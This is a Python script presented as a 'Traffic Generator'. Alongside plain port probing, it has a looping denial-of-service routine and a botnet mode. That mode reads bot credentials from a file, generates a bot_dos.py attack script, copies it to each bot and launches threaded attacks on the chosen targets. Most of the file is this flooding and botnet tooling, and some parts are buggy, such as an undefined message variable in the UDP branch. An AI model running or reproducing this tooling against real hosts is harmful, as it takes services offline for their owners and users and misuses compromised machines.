# Traffic Generator
from Inputs import get_inputs, get_bot_info
import Botnet
import getpass, socket, time, subprocess, threading, sys, json, random, os
#quit()
# generate regular traffic and requests
def generate_traffic(targets, transmission, ports, buffer_size, message):
    data_package = {}
    if transmission == "TCP":
        for target in targets:
            data_package[target] = []
            for port in ports:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    conn.connect((target, port))
                    if port == 80:
                        conn.sendall(b"GET / HTTP/1.0\r\n\r\n")
                        data = conn.recv(buffer_size)
                        data = data.decode()
                        data = data.rstrip()
                        data_package[target].append((port, data))
                    else:
                        data = conn.recv(buffer_size)
                        data = data.decode()
                        data = data.rstrip()
                        data_package[target].append((port, data))
                except Exception as error:
                    data_package[target].append((port, str(error)))
    elif transmission == "UDP":
        try:
            for target in targets:
                data_package[target] = []
                for port in ports:
                    conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    conn.connect((target, port))
                    data = conn.sendto(message.encode(), (target, port))
                    data_package[target].append((port, data))
        except Exception as error:
            data_package[target].append((port, str(error)))

    return(data_package)

# attempt denial of service on host
def dos(targets, transmission, ports, buffer_size, message):
    analyze = {}
    for target in targets:
        analyze[target] = ports

    while True:
        if transmission == "TCP":
            target = random.choice(targets)
            port = random.choice(analyze[target])
            start_time = time.time()
            try:
                if port == 80:
                    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    conn.connect((target, port))
                    conn.sendall(b"GET / HTTP/1.0\r\n\r\n")
                    data = conn.recv(buffer_size)
                    data = data.decode()
                    conn.close()
                else:
                    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    conn.connect((target, port))
                    data = conn.recv(buffer_size)
                    data = data.decode()
                    conn.close()

            except Exception as error:
                data = str(error)

            end_time = time.time() - start_time
            if end_time > float(2) or 'refused it' in data:
                sys.stdout.write("Removing port: {}. For target: {}.\n".format(str(port), target))
                sys.stdout.write("Target took too long to respond or connection refused.\n")
                sys.stdout.flush()

                analyze[target].remove(port)

        elif transmission == "UDP":
            target = random.choice(targets)
            port = random.choice(ports)
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                conn.connect((target, port))

                conn.sendto(attack_message.encode(), (target, port))
                conn.close()
            except Exception as error:
                pass

    return("break")

# attempt distributed denial of service on host with multiple bots (botnet) and localhost
def ddos(bot, username, password, script, targets):
    Botnet.generate_dos(bot, username, password, script, targets)
    return()

def create_bot_dos_script(script, targets, attack_message, ports, transmission, buffer_size):
    with open(script, "r") as scriptRead:
        lines = scriptRead.readlines()

    for line in lines:
        idx = lines.index(line)
        lines[idx] = line.rstrip()
    
    target = "targets = "
    message = "attack_message = "
    port_nums = "ports = "
    protocol = "transmission = "
    buff_size = "buffer_size = "

    target_array_string = "[{}]".format(", ".join(targets))
    port_array_string = "[{}]".format(", ".join(ports))
    
    for line in lines[0:7]:
        if target in line:
            idx = lines.index(line)
            lines[idx] = target + "'{}'".format(target_array_string)

        if message in line:
            idx = lines.index(line)
            lines[idx] = message + '"{}"'.format(attack_message)

        if port_nums in line:
            idx = lines.index(line)
            lines[idx] = port_nums + port_array_string

        if protocol in line:
            idx = lines.index(line)
            lines[idx] = protocol + '"{}"'.format(transmission)

        if buff_size in line:
            idx = lines.index(line)
            lines[idx] = buff_size + str(buffer_size)

    with open(script, "w") as scriptWrite:
        for line in lines:
            scriptWrite.write(line + "\n")

    return("break")

username = getpass.getuser()
filename = "C:\\Users\\{}\\eclipse-workspace\\traffic-gen\\inputs.txt".format(username)

inputs = get_inputs(filename)

transmission = inputs['Transmission']

ports = inputs['Port(s)']
ports = ports.replace("[", "")
ports = ports.replace("]", "")
ports = ports.split(",")

# not all elements will be filled, so pass if invalid literal
for port in ports:
    try:
        int_port = int(port)
        idx = ports.index(port)
        ports[idx] = int_port
    except Exception as error:
        pass

ports = [port for port in ports if not type(port) is str]
port_string = [str(port) for port in ports if not port == ' ']

buffer_size = inputs['Packet Size']

targets = inputs['Targets(s)']
targets = targets.replace("[", "")
targets = targets.replace("]", "")
targets = targets.split(",")
targets = [target for target in targets if not target == ' ']

include_localhost = inputs['Localhost?']

_dos = inputs['DOS']

# apply byte conversion if required
if "KB" in buffer_size:
    buffer_size = buffer_size.replace("Kb", "")
    buffer_size = int(buffer_size) * 1024
elif "B" in buffer_size:
    buffer_size = int(buffer_size.replace("B", ""))

if _dos == "NONE":
    message = "General Traffic"
    output = generate_traffic(targets, transmission, ports, buffer_size, message)
    sys.stdout.write(json.dumps(output) + "\n")
    sys.stdout.flush()
elif _dos == "SINGLE":
    sys.stdout.write("DOS on {}.\n".format(", ".join(targets)))
    sys.stdout.flush()
    message = "DENIAL OF SERIVCE"
    dos(targets, transmission, ports, buffer_size, message)
elif _dos == "DISTRIBUTED":
    sys.stdout.write("PREPARING BOTNET...\n")
    sys.stdout.flush()

    att_msg = "DISTRIBUTED DENIAL OF SERVICE"
    filename = "C:\\Users\\{}\\eclipse-workspace\\traffic-gen\\botnet.txt".format(username)
    bot_data = get_bot_info(filename)
    
    botnet = {}

    for bot in bot_data:
        bot = bot.rstrip()
        bot = bot.replace(" ", "")

        split_data = bot.split(",")

        botnet[split_data[0]] = [] 
        botnet[split_data[0]].append(split_data[1])
        botnet[split_data[0]].append(split_data[2])

    # generate bot_dos.py
    script = "C:\\Users\\{}\\Desktop\\traffic-generator\\bot_dos.py".format(username)
    create_bot_dos_script(script, targets, att_msg, port_string, transmission, buffer_size)
    
    # transfer the script to each bot, remove bot if authentication failure or some other failure to access
    for bot, bot_credentials in botnet.items():
        username = bot_credentials[0]
        password = bot_credentials[1]
        remove_bots = Botnet.transfer_script(bot, username, password, script)

    if len(remove_bots) > 0:
        for bot in remove_bots:
            botnet.pop(bot)

    # run the attack
    script = "bot_dos.py"
    sys.stdout.write("BOTNET READY\n")
    sys.stdout.flush()

    if include_localhost != "No":
        _thread = threading.Thread(target=dos, args=((targets, transmission, ports, buffer_size, att_msg)))
        _thread.start()

        sys.stdout.write("Localhost is attacking {}.\n".format(", ".join(targets)))
        sys.stdout.flush()

    for bot, bot_credentials in botnet.items():
        username = bot_credentials[0]
        password = bot_credentials[1]

        _thread = threading.Thread(target=ddos, args=((bot, username, password, script, targets)))
        _thread.start()

        sys.stdout.write("{} is attacking {}.\n".format(bot, ", ".join(targets)))
        sys.stdout.flush()

    sys.exit(0)